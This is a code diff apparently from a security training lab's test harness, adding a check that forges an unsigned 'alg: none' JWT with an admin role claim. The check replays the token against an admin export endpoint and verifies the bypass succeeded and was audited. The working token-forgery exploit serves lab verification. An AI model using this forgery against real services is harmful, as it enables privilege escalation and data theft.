@@ -663,6 +663,117 @@ def run_plugin_http_sequence(
                 f"audit={audit_status}; direct_read_audited={direct_read_audited}"
             ),
         )
+    if plugin == "jwt-role-confusion":
+        import base64
+
+        def b64url(value: dict) -> str:
+            raw = json.dumps(value, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
+            return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
+
+        session_status, session, _, session_route = http_json_first(
+            "GET",
+            base_url,
+            ["/api/identity/session", "/labforge/scaffold/identity/session"],
+            None,
+            timeout_seconds,
+        )
+        policy_status, policy, _, policy_route = http_json_first(
+            "GET",
+            base_url,
+            ["/api/identity/policy", "/labforge/scaffold/identity/policy"],
+            None,
+            timeout_seconds,
+        )
+        analyst_token = str(session.get("token") or "")
+        denied_status, denied, _, denied_route = http_json_first(
+            "GET",
+            base_url,
+            [
+                f"/api/identity/admin/export?token={quote(analyst_token)}",
+                f"/labforge/scaffold/identity/admin/export?token={quote(analyst_token)}",
+            ],
+            None,
+            timeout_seconds,
+        )
+        target_role = str(policy.get("target_role") or "admin")
+        issuer = str(policy.get("issuer") or "labforge-idp")
+        forged_token = (
+            f"{b64url({'typ': 'JWT', 'alg': 'none', 'kid': 'ops-2026'})}."
+            f"{b64url({'iss': issuer, 'sub': 'learner.analyst', 'role': target_role, 'scope': 'reports:read identity:preview', 'aud': service})}."
+        )
+        preview_status, preview, _, preview_route = http_json_first(
+            "POST",
+            base_url,
+            ["/api/identity/token-preview", "/labforge/scaffold/identity/token-preview"],
+            {"token": forged_token},
+            timeout_seconds,
+        )
+        accepted_status, accepted, _, accepted_route = http_json_first(
+            "GET",
+            base_url,
+            [
+                f"/api/identity/admin/export?token={quote(forged_token)}",
+                f"/labforge/scaffold/identity/admin/export?token={quote(forged_token)}",
+            ],
+            None,
+            timeout_seconds,
+        )
+        audit_status, audit, _, audit_route = http_json_first(
+            "GET",
+            base_url,
+            ["/api/identity/audit", "/labforge/scaffold/identity/audit"],
+            None,
+            timeout_seconds,
+        )
+        records = audit.get("records", []) if isinstance(audit, dict) else []
+        denied_recorded = any(
+            isinstance(record, dict)
+            and record.get("action") == "admin-export"
+            and record.get("accepted") is False
+            for record in records
+        )
+        accepted_recorded = any(
+            isinstance(record, dict)
+            and record.get("action") == "admin-export"
+            and record.get("accepted") is True
+            for record in records
+        )
+        role_confusion = (
+            preview_status == 200
+            and preview.get("claims", {}).get("role") == target_role
+            and preview.get("signature_valid") is True
+            and accepted_status == 200
+            and accepted.get("accepted") is True
+        )
+        ok = (
+            landing_ok
+            and session_status == 200
+            and session.get("role") == policy.get("normal_role", "analyst")
+            and bool(analyst_token)
+            and policy_status == 200
+            and policy.get("preview_api") == "POST /api/identity/token-preview"
+            and denied_status == 403
+            and role_confusion
+            and audit_status == 200
+            and denied_recorded
+            and accepted_recorded
+        )
+        return plugin_step(
+            order,
+            step_id,
+            service,
+            plugin,
+            base_url,
+            evidence,
+            ok,
+            (
+                f"{context_note}; session_route={session_route}; policy_route={policy_route}; preview_route={preview_route}; "
+                f"denied_route={denied_route}; accepted_route={accepted_route}; audit_route={audit_route}; "
+                f"session={session_status}; policy={policy_status}; denied={denied_status}; preview={preview_status}; "
+                f"accepted={accepted_status}; audit={audit_status}; role_confusion={role_confusion}; "
+                f"denied_recorded={denied_recorded}; audit_recorded={accepted_recorded}"
+            ),
+        )
     if plugin == "sql-injection-reporting":
         catalog_status, catalog, _, catalog_route = http_json_first(
             "GET",
@@ -1658,6 +1769,7 @@ def plugin_landing_probe(base_url: str, plugin: str, timeout_seconds: int) -> tu
         "ssti-preview": (["/operations/preview", "/labforge/scaffold/ssti-preview"], ["Response Preview"]),
         "stored-xss-review": (["/operations/review", "/labforge/scaffold/review"], ["Review Intake"]),
         "idor-object-access": (["/objects", "/api/business-objects", "/labforge/scaffold/objects"], ["Business Object Catalog"]),
+        "jwt-role-confusion": (["/operations/identity", "/api/identity/session", "/labforge/scaffold/identity/session"], ["Identity Operations Console"]),
         "sql-injection-reporting": (["/operations/reports", "/api/reports", "/labforge/scaffold/reports"], ["Reporting Workbench"]),
         "ssrf-internal-fetch": (["/operations/fetch", "/labforge/scaffold/fetch"], ["Upstream Import Console"]),
         "path-traversal-download": (["/documents", "/labforge/scaffold/documents"], ["Document Library"]),
